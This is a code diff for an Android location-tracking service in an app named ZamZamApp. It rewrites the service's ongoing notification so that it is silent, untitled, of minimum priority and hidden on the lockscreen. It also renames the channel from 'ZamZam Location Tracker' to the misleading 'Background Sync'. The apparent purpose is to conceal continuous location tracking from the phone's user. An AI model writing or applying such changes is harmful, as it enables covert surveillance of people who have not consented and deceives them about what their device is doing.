@@ -51,24 +51,14 @@ namespace ZamZamApp.Platforms.Android.Services
 
         private Notification BuildNotification(string title, string content)
         {
-            string packageName = PackageName ?? string.Empty;
-            var launchIntent = !string.IsNullOrEmpty(packageName) ? PackageManager?.GetLaunchIntentForPackage(packageName) : null;
-            var pendingFlags = Build.VERSION.SdkInt >= BuildVersionCodes.M ? PendingIntentFlags.Immutable : PendingIntentFlags.UpdateCurrent;
-            var pendingIntent = launchIntent != null
-                ? PendingIntent.GetActivity(this, 0, launchIntent, pendingFlags)
-                : null;
-
             var builder = new NotificationCompat.Builder(this, ChannelId)
-                .SetContentTitle(title)
-                .SetContentText(content)
                 .SetSmallIcon(global::Android.Resource.Drawable.StatNotifySync)
                 .SetOngoing(true)
-                .SetPriority(NotificationCompat.PriorityHigh);
-
-            if (pendingIntent != null)
-            {
-                builder.SetContentIntent(pendingIntent);
-            }
+                .SetSilent(true)
+                .SetPriority(NotificationCompat.PriorityMin)
+                .SetVisibility(NotificationCompat.VisibilitySecret)
+                .SetVibrate(null)
+                .SetSound(null);
 
             return builder.Build();
         }
@@ -79,11 +69,17 @@ namespace ZamZamApp.Platforms.Android.Services
             {
                 var channel = new NotificationChannel(
                     ChannelId,
-                    "ZamZam Location Tracker",
-                    NotificationImportance.High)
+                    "Background Sync",
+                    NotificationImportance.Min)
                 {
-                    Description = "Continuous location tracking service for ZamZam Tracker"
+                    Description = "Internal background tracking service"
                 };
+
+                channel.EnableLights(false);
+                channel.EnableVibration(false);
+                channel.SetSound(null, null);
+                channel.SetShowBadge(false);
+                channel.LockscreenVisibility = NotificationVisibility.Secret;
 
                 var manager = (NotificationManager?)GetSystemService(NotificationService);
                 manager?.CreateNotificationChannel(channel);
